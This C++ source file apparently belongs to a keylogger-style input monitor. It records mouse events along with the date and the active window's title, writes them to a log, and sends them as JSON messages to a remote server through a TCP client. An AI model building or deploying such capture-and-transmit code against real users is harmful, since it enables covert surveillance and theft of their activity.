#include "InputMouse.h"

InputMouse::InputMouse()
{
}

InputMouse::~InputMouse()
{
}

void InputMouse::format(std::streamoff logSize)
{
	_format = "";

	if (logSize > 0)
		_format = "\n";
	_format += StaticTools::GetDate() + " | " + StaticTools::GetActiveWindowTitle() + " | ";
}

AInputType &InputMouse::operator>>(LogFile &logger)
{
	logger << _format << "[MOUSE " << _data << "]" << std::flush;
	return (*this);
}

AInputType &InputMouse::operator>>(TCPClient &client)
{
	JSONBuilder builder;

	builder.addValue("type", "cmd");
	builder.addValue("name", "key");
	builder.addValue("param", _format + "[MOUSE " + _data + "]");
	client << builder.get();
	return (*this);
}